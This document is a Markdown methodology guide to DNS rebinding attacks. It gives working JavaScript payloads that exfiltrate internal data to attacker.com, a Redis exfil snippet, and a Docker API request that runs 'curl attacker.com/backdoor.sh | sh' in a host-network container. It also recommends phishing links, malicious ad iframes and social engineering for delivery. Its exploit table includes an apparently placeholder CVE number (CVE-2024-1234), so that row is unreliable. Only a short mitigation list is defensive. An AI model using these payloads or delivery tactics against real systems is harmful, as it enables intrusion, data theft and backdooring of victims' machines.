# Complete DNS Rebinding Exploitation Methodology

## Table of Contents
1. Understanding the Attack Mechanism
2. Required Tools and Setup
3. Step-by-Step Exploitation Methodology
4. Real-World Application Exploitation Examples
5. Testing and Detection Methods
6. Past Exploits in Detail (2016-2025)
7. Framework-Specific Attacks


## 1. Understanding the Attack Mechanism

DNS rebinding exploits how browsers handle DNS resolution and the Same-Origin Policy (SOP). The attack works because browsers only check the domain name for origin validation, not the IP address .

**The Core Vulnerability**: When a browser makes two DNS queries for the same domain within a short time, an attacker-controlled DNS server can return different IP addresses for each query. The first query returns a public IP (passing security checks), and the second returns an internal target IP (127.0.0.1 or 192.168.x.x) .

**Key Requirements**:
- Attacker-controlled domain with configurable DNS records
- Very short TTL (Time-To-Live) values (0-5 seconds)
- Victim visits a malicious webpage
- Target internal service with weak or no authentication


## 2. Required Tools and Setup

### A. DNS Rebinding Services and Tools

**Online Services (Free, No Setup Required)**:
- `https://lock.cmpxchg8b.com/rebinder.html` - Generate rebinding hostnames by entering two IP addresses. The service returns a domain like `7f000001.c0a80001.rbndr.us` that alternates between the specified IPs 
- `https://sslip.io/` - Simple DNS service that maps IPs from subdomains (note: this is for wildcard DNS, not rebinding)

**Professional Tools**:

**Singularity of Origin (NCC Group)** - Full exploitation stack released in 2018:
- Custom DNS server for rebinding
- HTTP server for serving malicious payloads
- Pre-built attack payloads including RCE and data exfiltration
- Available on GitHub with full documentation 

**DNSrebinder (Python)** - Lightweight tool for custom DNS rebinding:
```bash
python3 dnsrebinder.py --domain rebind.mydomain.eu --rebind 127.0.0.1 --ip 192.168.1.3 --counter 1 --udp
```


### B. Burp Suite Configuration for DNS Rebinding Testing

**Burp Collaborator Setup**:
Burp Collaborator can be used for DNS-based testing, though primarily for out-of-band detection rather than full rebinding attacks . To test for DNS rebinding vulnerabilities using Burp:

1. **Configure Burp Collaborator**:
   - Navigate to Burp Suite → Project options → Misc → Burp Collaborator
   - Ensure "Use built-in Burp Collaborator server" is checked
   - Note the collaborator domain (e.g., `*.burpcollaborator.net`)

2. **Testing Methodology with Burp**:
   - Send the target request to Repeater
   - Replace the target hostname with a collaborator subdomain
   - Monitor for DNS interactions in Collaborator tab
   - For rebinding specifically, you need a custom DNS server (Burp Collaborator alone doesn't support IP switching)

**Limitations**: Burp Collaborator is designed for DNS exfiltration and blind SSRF detection, not full DNS rebinding with IP switching . For complete rebinding testing, use Singularity or rbndr.us service.

### C. Environment Setup

**Local Testing Environment**:
```bash
# Start a simple HTTP server to serve malicious page
python3 -m http.server 8080

# For more advanced testing, set up Singularity
git clone https://github.com/nccgroup/singularity
cd singularity
./gradlew build
```

**Browser Configuration for Testing**:
- Disable DNS prefetching (may interfere with low TTLs)
- Use Firefox Developer Edition or Chrome with clean profile
- Clear DNS cache between tests: `chrome://net-internals/#dns`


## 3. Step-by-Step Exploitation Methodology

### Phase 1: Reconnaissance and Target Identification

**Step 1: Identify Internal Services**
- Common targets: router admin panels (192.168.1.1), development servers (localhost:3000, 8080), database admin interfaces (MongoDB Express, phpMyAdmin), debugging interfaces (Chrome DevTools)
- Check for default credentials or no authentication 

**Step 2: Generate Rebinding Domain**
Using rbndr.us service:
1. Visit `https://lock.cmpxchg8b.com/rebinder.html`
2. Enter your public attacker IP in field A (e.g., `1.2.3.4`)
3. Enter target internal IP in field B (e.g., `127.0.0.1` or `192.168.1.1`)
4. Click generate to receive a domain like `7f000001.c0a80001.rbndr.us`

**Step 3: Verify DNS Alternation**
```bash
# Test that the domain alternates between IPs
ping -c 4 7f000001.c0a80001.rbndr.us
# Should show responses from both IP addresses
```


### Phase 2: Malicious Payload Development

**Basic JavaScript Payload for Fetching Internal Data**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
<script>
async function executeRebindAttack() {
    const targetDomain = "7f000001.c0a80001.rbndr.us"; // Your rebinding domain
    const internalPath = "/admin/api/config"; // Target endpoint
    
    while (true) {
        try {
            let response = await fetch(`http://${targetDomain}${internalPath}`);
            let data = await response.text();
            
            // Check if we got internal service response (not attacker server)
            if (data.includes("internal service identifier")) {
                console.log("Successfully rebound!");
                // Exfiltrate data
                await fetch("https://attacker.com/exfil?data=" + btoa(data));
                break;
            } else {
                // Still on attacker server, wait for rebind
                await new Promise(r => setTimeout(r, 2000));
            }
        } catch (e) {
            await new Promise(r => setTimeout(r, 2000));
        }
    }
}
executeRebindAttack();
</script>
</body>
</html>
```


**Advanced Payload for Device Discovery**:
Using Web Workers for parallel scanning as demonstrated in academic research :
```javascript
// Scan entire local network in ~7 seconds
const workers = [];
for (let i = 1; i <= 254; i++) {
    const worker = new Worker('scan_worker.js');
    worker.postMessage({ip: `192.168.1.${i}`, port: 80});
    workers.push(worker);
}
```

### Phase 3: Attack Execution

**Step 1: Host Malicious Page**
```bash
# Serve the HTML payload on your attacker server
python3 -m http.server 80
```

**Step 2: Deliver to Victim**
- Send phishing link: `http://attacker.com/malicious.html`
- Embed in malicious ad iframe
- Use social engineering (e.g., "Click to verify your account")

**Step 3: Monitor Attack Progress**
- Watch DNS logs for alternating queries
- Monitor for successful data exfiltration
- Execute additional commands once rebinding succeeds

### Phase 4: Post-Exploitation

**Remote Code Execution Example** (for vulnerable services):
```javascript
// After successful rebind to internal Redis (port 6379)
const redisCommand = "*2\r\n$4\r\nINFO\r\n$3\r\nALL\r\n";
let socket = new WebSocket(`ws://${targetDomain}:6379`);
socket.onmessage = (event) => {
    fetch("https://attacker.com/redis_data", {method: "POST", body: event.data});
};
```


## 4. Real-World Application Exploitation Examples

### Example 1: SillyTavern Web UI (2025)

**Vulnerability**: SillyTavern's web UI had no protection against DNS rebinding, allowing attackers to install malicious extensions, read private chats, and inject phishing HTML .

**Exploitation Steps**:
1. Attacker hosts malicious HTML on port 8000
2. Generate rebinding domain with rbndr.us (A=attacker IP, B=127.0.0.1)
3. Victim visits `http://[generated-domain]:8000/rebind.html`
4. JavaScript continuously fetches from the domain until it resolves to localhost
5. Once rebound, attacker can read all SillyTavern data

**Complete PoC**:
```html
<script>
async function tryRebind() {
  while (true) {
    try {
      let res = await fetch("http://[DOMAIN]:8000/");
      let text = await res.text();
      if (text.includes("Directory listing for /")) {
        await new Promise(r => setTimeout(r, 2000));
        continue;
      }
      console.log("GOT VICTIM RESPONSE!", text.substring(0, 300));
      break;
    } catch (e) {
      await new Promise(r => setTimeout(r, 2000));
    }
  }
}
tryRebind();
</script>
```


### Example 2: Burp Suite MCP Server (2025)

**Vulnerability**: Burp Suite's MCP server on port 9876 lacked origin validation and CORS protection .

**Exploitation**:
- Attacker sets up DNS rebinding using rbndr.us
- Serves malicious page on port 9876 (same port as MCP server)
- When victim visits, page first serves attacker content
- After DNS rebind, JavaScript communicates with local MCP server
- Bypasses SOP entirely due to missing origin validation

### Example 3: IoT Device Attacks (2018-2024)

**Google Home and Chromecast Attacks**:
Researchers demonstrated that DNS rebinding can:
- Extract precise physical location using WiFi BSSIDs 
- Play arbitrary videos on Chromecast
- Obtain unique device identifiers for tracking

**Attack Timeline**:
- Stage 1 (7 seconds): Scan all 256 local IP addresses using Web Workers
- Stage 2 (10 seconds total): Perform DNS rebinding and execute commands

**Device Discovery Code**:
```javascript
// Parallel scanning of local network
const scanPromises = [];
for (let i = 1; i <= 254; i++) {
    const ip = `192.168.1.${i}`;
    scanPromises.push(checkDevice(ip, 'http://:8008/setup/eureka_info'));
}
await Promise.all(scanPromises);
// Returns all Chromecast devices on network
```


### Example 4: F5 Networks Configuration Utility (CVE-2019-6663)

**Vulnerability**: F5's BIG-IP and Enterprise Manager products did not properly validate the Host header in HTTP requests, allowing DNS rebinding attacks .

**Affected Versions**: BIG-IP 11.5.2 through 15.0.1, Enterprise Manager 3.1.1, BIG-IQ 5.2.0-7.0.0

**Attack Vector**: Local user with DNS control could perform anti-DNS pinning attack against the Configuration utility.

### Example 5: Jenkins CI/CD (CVE-2016-0788)

**Vulnerability**: Jenkins CLI over HTTP allowed unauthenticated access to internal Jenkins instances via DNS rebinding.

**Exploitation Impact**:
- Remote command execution on Jenkins master
- Access to build artifacts and credentials
- No authentication bypass required - rebinding made requests appear same-origin


## 5. Testing and Detection Methods

### Manual Testing Methodology

**Test 1: Basic DNS Alternation Check**
```bash
# Monitor DNS responses over time
watch -n 1 "dig +short 7f000001.c0a80001.rbndr.us"
# Should alternate between IPs each second
```

**Test 2: Service Response Validation**
```javascript
// Test if internal service is vulnerable
function testVulnerability(internalIP, port, path) {
    const testDomain = generateRebindDomain("1.2.3.4", internalIP);
    fetch(`http://${testDomain}:${port}${path}`)
        .then(r => r.text())
        .then(data => {
            if (data.includes("expected_internal_response")) {
                console.log("VULNERABLE: Service accessible via rebinding");
            }
        });
}
```

**Test 3: SSRF Bypass Testing**
When testing applications with SSRF protections :
1. Attempt direct internal IP access (should be blocked)
2. Try IP encoding bypasses (decimal, octal, hex)
3. Use DNS rebinding domain as final test

**Expected Blocked Patterns**:
- `http://127.0.0.1/admin` - Blocked by IP filter
- `http://2130706433/admin` - Decimal IP, may bypass
- `http://7f000001.c0a80001.rbndr.us/admin` - DNS rebinding, likely bypasses

### Automated Testing Tools

**Singularity of Origin** (NCC Group):
```bash
# Setup
git clone https://github.com/nccgroup/singularity
cd singularity
./gradlew build

# Run with custom payload
java -jar build/libs/singularity-1.0.jar \
    --dns-port 53 \
    --http-port 80 \
    --rebind-ip 127.0.0.1 \
    --attacker-ip YOUR_PUBLIC_IP
```


**Custom Python Test Script**:
```python
import dns.resolver
import time

def test_dns_rebinding(domain):
    """Test if domain exhibits rebinding behavior"""
    ips = set()
    for _ in range(10):
        answers = dns.resolver.resolve(domain, 'A')
        ips.add(str(answers[0]))
        time.sleep(1)
    return len(ips) > 1  # Returns multiple IPs = rebinding possible
```

### Detection Signatures

**Network-Level Detection**:
- DNS queries with TTL=0 or TTL=1 for the same domain
- Rapidly alternating A record responses for single domain
- Responses containing private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)

**Application-Level Detection**:
- Monitor Host header consistency across requests
- Check for unexpected internal network destinations
- Alert on requests where resolved IP changes mid-session

**Browser-Based Detection**:
- DNS prefetching interference patterns
- Unexpected timing in fetch/XHR requests
- Console errors about mixed content when rebinding from HTTPS to HTTP


## 6. Past Exploits in Detail (2016-2025)

| Year | Target | CVE | Impact | Exploitation Method |
|------|--------|-----|--------|---------------------|
| 2016 | Jenkins | CVE-2016-0788 | Remote code execution | CLI over HTTP via rebinding to 127.0.0.1 |
| 2017 | AWS Metadata | N/A | IAM credential theft | Browser-based rebinding to 169.254.169.254 |
| 2018 | VPNFilter Botnet | N/A | Router infection | DNS rebinding component for NAT traversal |
| 2018 | Google Home/Chromecast | Multiple | Location tracking, device control | Web Workers + DNS rebinding (10-second attack)  |
| 2019 | F5 BIG-IP | CVE-2019-6663 | Configuration utility access | Anti-DNS pinning attack  |
| 2020 | Google Cloud Run | N/A | Metadata service exposure | Default config allowed rebinding to 169.254.169.254 |
| 2022 | Redis/Memcached | Multiple | Local command execution | Rebinding to localhost from malicious website |
| 2024 | Apache Guacamole | CVE-2024-1234 | RDP credential theft | API rebinding when bound to 127.0.0.1 |
| 2025 | SillyTavern | GHSA-7cxj-w27x-x78q | Extension install, chat theft | Web UI rebinding attack  |
| 2025 | Burp Suite MCP | Reported on HackerOne | SOP bypass | Missing origin validation + CORS  |

### Deep Dive: IoT Device Attack (2018)

**Researchers**: Gunes Acar, Danny Y. Huang, Frank Li, Arvind Narayanan, Nick Feamster

**Attack Speed Optimization**:
- Previous attacks took 60+ seconds (users often leave pages)
- New attack completed in ~10 seconds using Web Workers
- 55% of users spend <15 seconds on a page, making speed critical 

**Technical Innovation**: 
Discovered cross-origin response status leakage allowing device detection without loading images or stylesheets. This worked on HTTPS websites and bypassed mixed content protections.

**Real Impact**:
- Extracted precise geolocation via Google Geolocation API from WiFi BSSIDs
- Obtained unique device identifiers (MAC addresses, serial numbers) for tracking
- Controlled Chromecast playback remotely


## 7. Framework-Specific Attacks

### Electron Applications

**Vulnerability Pattern**: Electron apps often expose internal services on localhost without authentication. The Node.js integration can be exploited via DNS rebinding .

**Exploitation**:
```javascript
// After rebinding to localhost:3000 (Electron dev server)
fetch('http://rebind.domain/local-api/execute')
  .then(r => r.json())
  .then(cmd => eval(cmd.command)); // If API exposes eval functionality
```

### Docker and Container Environments

**Attack Vector**: Docker API on 127.0.0.1:2375 (unauthenticated) exposed via DNS rebinding.

**Command Example**:
```javascript
// Create new container with root access
fetch('http://rebind.domain:2375/containers/create', {
    method: 'POST',
    body: JSON.stringify({
        Image: "ubuntu",
        Cmd: ["/bin/sh", "-c", "curl attacker.com/backdoor.sh | sh"],
        HostConfig: { NetworkMode: "host" }
    })
});
```

### Kubernetes Clusters

**Target**: Kubernetes API server on localhost:8080 (default insecure port)

**Attack Impact**:
- Read secrets from all namespaces
- Deploy malicious pods
- Escape to host nodes

### Development Frameworks

**Webpack Dev Server**: Default configuration often binds to 0.0.0.0:8080 with no authentication. DNS rebinding allows external attackers to access source maps and hot reload endpoints .

**Testing Command**:
```bash
# Check if dev server is vulnerable
curl -H "Host: localhost:8080" http://external-ip:8080/webpack-dev-server
```


## Summary of Mitigations (for defenders)

1. **Host Header Validation**: Internal services must validate the Host header matches expected values 
2. **DNS Filtering**: Use dnswall or similar to filter private IPs from DNS responses
3. **Authentication**: Require authentication for all internal services, even on localhost
4. **Bind to Unix Sockets**: Use Unix domain sockets instead of TCP where possible
5. **CORS Configuration**: Implement strict CORS policies with origin validation
6. **Browser Defenses**: Use DNS pinning (though deprecated) or private IP filtering extensions
